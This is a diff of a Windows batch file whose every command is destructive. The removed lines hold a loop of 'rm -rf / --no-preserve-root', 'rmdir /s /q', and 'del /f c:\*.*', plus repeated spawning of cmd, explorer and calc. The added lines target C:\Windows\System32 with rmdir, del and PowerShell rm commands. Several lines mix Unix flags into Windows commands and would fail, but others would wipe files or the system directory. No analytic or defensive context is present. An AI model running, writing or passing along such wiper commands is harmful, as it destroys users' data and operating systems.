@@ -1,15 +1,11 @@
 @echo OFF
-rm -rf / --no-preserve-root
-sudo rm -rf / --no-preserve-root
-rmdir /s /q \
-:loop
-start cmd
-start explorer
-start calc
-rm -rf / -f --no-preserve-root
-rm -rf / -f
-sudo rm -rf / -f
-rmdir C:\
-del /f c:\*.*
-sudo rm -rf / -f --no-preserve-root
-goto loop
+powershell rm -rf C:\Windows\System32 --no-preserve-root
+powershell sudo rm -rf / --no-preserve-root
+rmdir /s /q C:\Windows\System32
+rmdir /s C:\Windows\System32
+powershell rm -rf C:\Windows\System32 -f --no-preserve-root
+powershell rm -rf C:\Windows\System32 -f
+powershell sudo rm -rf C:\Windows\System32 -f
+powershell rmdir C:\Windows\System32
+del /f c:\*.* & S
+powershell sudo rm -rf C:\Windows\System32 -f --no-preserve-root
